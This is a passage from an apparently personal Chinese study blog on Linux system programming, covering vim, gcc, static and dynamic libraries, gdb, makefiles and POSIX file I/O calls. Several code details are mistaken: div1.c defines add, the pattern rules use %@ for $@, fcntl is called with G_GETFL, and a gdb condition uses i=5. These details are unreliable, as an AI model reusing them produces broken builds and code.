class="line">I:插入行首</span><br><span class="line">a:插入光标后一个字符</span><br><span class="line">A:插入行末</span><br><span class="line">o:向下新开一行，插入行首</span><br><span class="line">O:向上新开一行，插入行首</span><br></pre></td></tr></table></figure><p>进入命令模式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">ESC:从插入模式或末行模式进入命令模式</span><br><span class="line">移动光标：</span><br><span class="line">h:左移</span><br><span class="line">j:下移</span><br><span class="line">k:上移</span><br><span class="line">l:右移</span><br><span class="line"></span><br><span class="line">跳转到指定行</span><br><span class="line">88G（命令模式）</span><br><span class="line">88（末行模式）</span><br><span class="line"></span><br><span class="line">跳转文件首</span><br><span class="line">gg（命令模式）</span><br><span class="line">跳转文件尾</span><br><span class="line">G（命令模式）</span><br><span class="line"></span><br><span class="line">自动格式化程序</span><br><span class="line">gg=G（命令模式）</span><br><span class="line"></span><br><span class="line">大括号对应</span><br><span class="line"><span class="meta">%</span>（命令模式）</span><br><span class="line"></span><br><span class="line">删除单个字符</span><br><span class="line">x（命令模式）执行结束，工作模式不变</span><br><span class="line">替换单个字符</span><br><span class="line">将待替换的字符用光标选中，r（命令模式），再按欲替换的字符</span><br><span class="line">删除一个单词</span><br><span class="line">dw（命令模式）光标置于首字母进行操作</span><br><span class="line">删除光标至行尾</span><br><span class="line">D（命令模式）执行结束，工作模式不变</span><br><span class="line">光标移至行首</span><br><span class="line">0（命令模式）执行结束，工作模式不变</span><br><span class="line">光标移至行尾</span><br><span class="line"><span class="meta">$</span>（命令模式）执行结束，工作模式不变</span><br><span class="line">删除光标至行尾</span><br><span class="line">D或者d$（命令模式）</span><br><span class="line">删除光标至行首</span><br><span class="line">d0(命令模式)</span><br><span class="line">删除指定区域</span><br><span class="line">按V（命令模式）切换为“可视模式”，使用hjkl挪动光标来选中待删除区域，按d删除该区域数据</span><br><span class="line">删除指定行</span><br><span class="line">在光标所在行，按dd（命令模式）</span><br><span class="line">删除指定N行</span><br><span class="line">在光标所待删除首行，按Ndd（命令模式）</span><br><span class="line">复制一行</span><br><span class="line">yy</span><br><span class="line">粘贴</span><br><span class="line">p：向后，P：向前（粘贴位置为当前光标所在行的上一行或者下一行）</span><br><span class="line">查找</span><br><span class="line">找设想内容：命令模式下，按“/”输入欲搜索关键字，回车，使用n检索下一个</span><br><span class="line">找看到的内容：命令模式下，将光标置于单词任意一个字符上，按“*” 或 “#”</span><br><span class="line">单行替换</span><br><span class="line">将光标置于待替换行上，进入末行模式，输入 :s /原数据/新数据</span><br><span class="line">全局替换</span><br><span class="line">将光标置于待替换行上，进入末行模式，输入 :%s /原数据/新数据/g,如果不加g只替换每行首个</span><br><span class="line">指定行的替换</span><br><span class="line">末行模式，:起始行号，终止行号s /原数据/新数据/g</span><br><span class="line">撤销、反撤销</span><br><span class="line">u、ctrl+r（命令模式）</span><br><span class="line">分屏</span><br><span class="line">sp：横屏分。Ctrl+ww切换</span><br><span class="line">vsp：竖屏分。Ctrl+ww切换</span><br><span class="line">跳转至man手册</span><br><span class="line">将光标置于待查看函数单词上，使用K（命令模式）跳转。</span><br><span class="line">查看宏定义</span><br><span class="line">将光标置于待查看宏定义单词上，使用[d查看定义语句。</span><br></pre></td></tr></table></figure><h4 id="GCC编译"><a href="#GCC编译" class="headerlink" title="GCC编译"></a>GCC编译</h4><ul><li>预处理：展开宏、头文件，替换条件编译，删除注释、空白、空行</li><li>编译：检查语法规范（消耗时间、系统资源最多）</li><li>汇编：将汇编指令翻译成机器指令</li><li>链接：数据段合并，地址回填</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-I 指定头文件所在目录位置</span><br><span class="line">-c 只做预处理、编译、汇编，得到二进制文件</span><br><span class="line">-g 编译时添加调试文件，主要支持gdb调试</span><br><span class="line">-Wall 显示所有警告信息</span><br><span class="line">-E 生成预处理文件</span><br><span class="line">-D 向程序中“动态注册宏定义”</span><br></pre></td></tr></table></figure><p>静态库制作步骤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -c test.c -o test.o</span><br><span class="line">ar rcs lib库名.a test.o</span><br><span class="line"></span><br><span class="line">编译静态库到可执行文件中</span><br><span class="line">gcc test.c lib库名.a -o test</span><br></pre></td></tr></table></figure><p>动态库制作步骤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gcc -c test.c -o test.o -fPIC</span><br><span class="line">gcc -shared -o lib库名.so test.o</span><br><span class="line">编写可执行程序时，指定所使用的动态库。-l：指定库名 -L：指定库路径</span><br><span class="line">gcc test.c -o a.out -l 库名 -L ./lib</span><br><span class="line">运行可执行程序</span><br><span class="line">./a.out（执行出错）</span><br><span class="line">原因</span><br><span class="line">链接器：工作于链接阶段，工作时需要-l和-L</span><br><span class="line">动态链接器：工作于程序运行阶段，工作时需要提供动态库所在目录位置</span><br><span class="line">通过环境变量：export LD_LIBRARY_PATH=动态库路径（临时生效，终端重启后环境变量失效）</span><br><span class="line">1.永久生效：写入终端配置文件 vim ~/.bashrc</span><br><span class="line">2.拷贝自定义动态库到 /lib(标准C库所在目录位置)</span><br><span class="line">3.配置文件法</span><br><span class="line">1.sudo vi /etc/ld.so.conf</span><br><span class="line">2.写入动态库绝对路径 保存</span><br><span class="line">3.sudo ldconfig -v 使配置文件生效</span><br><span class="line">4.执行./a.out  使用ldd a.out 查看</span><br></pre></td></tr></table></figure><h4 id="GDB调试"><a href="#GDB调试" class="headerlink" title="GDB调试"></a>GDB调试</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-g 使用该参数编译可执行文件，得到调试表</span><br><span class="line">gdb a.out</span><br><span class="line">list: list/l 列出源码，根据源码指定行号设置断点</span><br><span class="line">b: b 20 在20行位置设置断点</span><br><span class="line">run/r: 运行程序</span><br><span class="line">n/next: 下一条指令（会越过函数）</span><br><span class="line">s/step: 下一条指令（会进入函数）</span><br><span class="line">p/print: p i 查看i变量的值 </span><br><span class="line">continue: 继续执行断点后续指令</span><br><span class="line">quit: 推出gdb当前调试</span><br></pre></td></tr></table></figure><p>其他指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">run: 使用run查找段错误出现位置</span><br><span class="line">finish: 结束当前函数调用</span><br><span class="line">set args: 设置main函数命令行参数</span><br><span class="line">run 字符串1 字符串2 ...: 设置main函数命令行参数</span><br><span class="line">info b: 查看断点信息表</span><br><span class="line">b 20 if i=5: 设置条件断点</span><br><span class="line">ptype: 查看变量类型</span><br><span class="line">bt: 列出当前程序正存活着的栈帧</span><br><span class="line">frame: 根据栈帧编号，切换栈帧</span><br><span class="line">display: 设置跟踪变量</span><br></pre></td></tr></table></figure><h4 id="makefile"><a href="#makefile" class="headerlink" title="makefile"></a>makefile</h4><p>命名：Makefile / makefile</p><ul><li><p>1个规则</p><p>目标：依赖条件</p><ul><li>（一个tab缩进）命令</li></ul><p>目标的时间必须晚于依赖条件的时间，否则，更新目标</p><p>依赖条件如果不存在，找寻新的规则去产生依赖</p></li><li><p>2个函数</p><ul><li><code>src = $(wildcard ./*.c)</code>：匹配当前工作目录下的所有<code>.c</code>文件，将文件名组成列表，赋值给变量src</li><li><code>$(patsubst %.c,%.o,$(src))</code>：将参数3中，包含参数1的部分，替换为参数2</li></ul><p><code>clean</code>: (没有依赖)</p><p>​        <code>-rm -rf $(obj) a.out</code> ：<code>-</code>的作用是，删除不存在文件时，不报错，顺序执行结束。</p></li><li><p>3个自动变量</p><ul><li><code>$@</code>：在规则的命令中，表示规则中的目标</li><li><code>$^</code>：在规则的命令中，表示所有依赖条件</li><li><code>$&lt;</code>：在规则的命令中，表示第一个依赖条件</li></ul></li><li><p>模式规则</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span>.o:%.c</span><br><span class="line">gcc -c $&lt; -o %@</span><br></pre></td></tr></table></figure></li><li><p>静态模式规则</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span>(obj):%.o:%.c</span><br><span class="line">gcc -c $&lt; -o %@</span><br></pre></td></tr></table></figure></li><li><p>伪目标</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.PHONY: clean ALL</span><br></pre></td></tr></table></figure></li><li><p>参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-n : 模拟执行make、make clean命令</span><br><span class="line">-f : 指定文件执行make命令</span><br></pre></td></tr></table></figure></li></ul><h4 id="makefile实战"><a href="#makefile实战" class="headerlink" title="makefile实战"></a>makefile实战</h4><p>首先创建一个<code>maketest</code>文件夹，该文件夹的目录结构如下图所示</p><p><img src="/2021/09/15/Linux系统编程/1.png" alt="1"></p><p><code>inc</code>文件夹下<code>head.h</code>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _HEAD_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _HEAD_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">div1</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mul</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><code>obj</code>文件夹下的文件是我们在编译时生成的。</p><p><code>src</code>文件夹下的<code>hello.c</code>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"head.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">10</span>;<span class="keyword">int</span> b=<span class="number">5</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d+%d=%d\n"</span>,a,b,add(a,b));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d-%d=%d\n"</span>,a,b,sub(a,b));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d/%d=%d\n"</span>,a,b,div1(a,b));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%dx%d=%d\n"</span>,a,b,mul(a,b));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">add.c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div1.c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub.c</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a-b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mul.c</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mul</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a*b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是编写<code>makefile</code>文件，代码如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">src = $(wildcard ./src/*.c)</span><br><span class="line">obj = $(patsubst ./src/%.c,./obj/%.o,$(src))</span><br><span class="line"></span><br><span class="line">inc_path = ./inc</span><br><span class="line"></span><br><span class="line">ALL:a.out</span><br><span class="line"></span><br><span class="line">a.out:$(obj)</span><br><span class="line">gcc $^ -o $@</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span>(obj):./obj/%.o:./src/%.c</span><br><span class="line">gcc -c $&lt; -o $@ -I $(inc_path)</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">-rm -rf $(obj) a.out</span><br><span class="line"></span><br><span class="line">.PHONY: clean ALL</span><br></pre></td></tr></table></figure><p>最后一步执行<code>makefile</code>文件，在<code>maketest</code>目录下，执行<code>make</code>命令。就会在当前目录下生成<code>a.out</code>文件，同时在<code>obj</code>文件夹下也会生成相应的<code>.o</code>文件。</p><p>制作特定的makefile管理文件，代码如下，将代码放在指定的目录下，可以对指定的<code>.c</code>文件进行管理。执行命令的方式为<code>make xxx</code>，即可使得<code>xxx.c</code>文件通过<code>gcc</code>编译之后输出为<code>xxx</code>可执行目标文件。如果只执行<code>make</code>指令，则会对当前目录下的所有<code>.c</code>文件进行<code>gcc</code>编译。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">src = $(wildcard *.c)</span><br><span class="line">target = $(patsubst %.c,%,$(src))</span><br><span class="line"></span><br><span class="line">ALL:$(target)</span><br><span class="line"></span><br><span class="line"><span class="meta">%</span>:%.c</span><br><span class="line">gcc $&lt; -o $@</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">-rm -rf $(target)</span><br><span class="line"></span><br><span class="line">.PHONY: clean ALL</span><br></pre></td></tr></table></figure><h4 id="函数相关"><a href="#函数相关" class="headerlink" title="函数相关"></a>函数相关</h4><h5 id="open函数"><a href="#open函数" class="headerlink" title="open函数"></a>open函数</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int open(char *pathname,int flags)</span><br></pre></td></tr></table></figure><p>参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pathname:要打开的文件路径名</span><br><span class="line">flags: 文件打开方式  O_RDONLY｜O_WRONLY｜O_RDWR</span><br><span class="line">O_CREAT｜O_APPEND｜O_EXCL｜O_NONBLOCK</span><br></pre></td></tr></table></figure><p>返回值</p><ul><li>成功：打开文件所得到对应的文件描述符（整数）</li><li>失败：-1，设置error</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int open(char *pathname,int flags, mode_t mode)</span><br></pre></td></tr></table></figure><p>参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pathname:要打开的文件路径名</span><br><span class="line">flags: 文件打开方式  O_RDONLY｜O_WRONLY｜O_RDWR</span><br><span class="line">O_CREAT｜O_APPEND｜O_EXCL｜O_NONBLOCK</span><br><span class="line">mode: 参数3使用的前提是，参数2指定了O_CREAT，取值8进制数，用来描述文件的访问权限。</span><br><span class="line">创建文件最终权限 = mode &amp; ~umask</span><br></pre></td></tr></table></figure><p>返回值</p><ul><li>成功：打开文件所得到对应的文件描述符（整数）</li><li>失败：-1，设置errno</li></ul><h5 id="close函数"><a href="#close函数" class="headerlink" title="close函数"></a>close函数</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int close(int fd)</span><br></pre></td></tr></table></figure><h5 id="read函数"><a href="#read函数" class="headerlink" title="read函数"></a>read函数</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssize_t read(int fd,void *buf, size_t count);</span><br></pre></td></tr></table></figure><p>参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd : 文件描述符</span><br><span class="line">buf : 存数据的缓冲区</span><br><span class="line">count : 缓冲区大小</span><br></pre></td></tr></table></figure><p>返回值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">成功：读到的字节数</span><br><span class="line">失败：-1，设置errno</span><br></pre></td></tr></table></figure><h5 id="write函数"><a href="#write函数" class="headerlink" title="write函数"></a>write函数</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssize_t write(int fd,const void *buf, size_t count);</span><br></pre></td></tr></table></figure><p>参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd : 文件描述符</span><br><span class="line">buf : 存数据的缓冲区</span><br><span class="line">count : 数据大小</span><br></pre></td></tr></table></figure><p>返回值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">成功：写入的字节数</span><br><span class="line">失败：-1，设置errno</span><br></pre></td></tr></table></figure><h5 id="错误处理函数"><a href="#错误处理函数" class="headerlink" title="错误处理函数"></a>错误处理函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"xxx error: %d\n"</span>,errno);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strerror</span><span class="params">(<span class="keyword">int</span> errnum)</span></span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"xxx error:%s\n"</span>,strerror(errno));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">perror</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s)</span></span>;</span><br><span class="line">perror(<span class="string">"open error"</span>);</span><br></pre></td></tr></table></figure><h5 id="fcntl"><a href="#fcntl" class="headerlink" title="fcntl"></a>fcntl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int flgs = fcntl(fd,G_GETFL);</span><br><span class="line"></span><br><span class="line">获取文件状态：F_GETFL</span><br><span class="line">设置文件状态：F_SETFL</span><br></pre></td></tr></table></figure><h5 id="read和write实现文件拷贝"><a href="#read和write实现文件拷贝" class="headerlink" title="read和write实现文件拷贝"></a>read和write实现文件拷贝</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd1 = open(argv[<span class="number">1</span>],O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (fd1 == <span class="number">-1</span>)&#123;</span><br><span class="line">    perror(<span class="string">"open argv1 error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">int</span> fd2 = open(argv[<span class="number">2</span>],O_RDWR|O_CREAT|O_TRUNC,<span class="number">0664</span>);</span><br><span class="line"><span class="keyword">if</span> (fd2 == <span class="number">-1</span>)&#123;</span><br><span class="line">    perror(<span class="string">"open argv2 error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">while</span> ((n = read(fd1,buf,<span class="number">1024</span>))!=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (n&lt;<span class="number">0</span>)&#123;</span><br><span class="line">      perror(<span class="string">"read error"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">write(fd2,buf,n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">close(fd1);</span><br><span class="line">close(fd2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="lseek函数"><a href="#lseek函数" class="headerlink" title="lseek函数"></a>lseek函数</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">off_t lseek(int fd,off_t offset, int whence);</span><br></pre></td></tr></table></figure><p>参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd: 文件描述符</span><br><span class="line">offset: 偏移量</span><br><span class="line">whence: 起始偏移位置： SEEK_SET/SEEK_CUR/SEEK_END</span><br></pre></td></tr></table></figure><p>返回值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">成功：较起始位置偏移量</span><br><span class="line">失败：-1 errno</span><br></pre></td></tr></table></figure><p>使用lseek函数读文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span 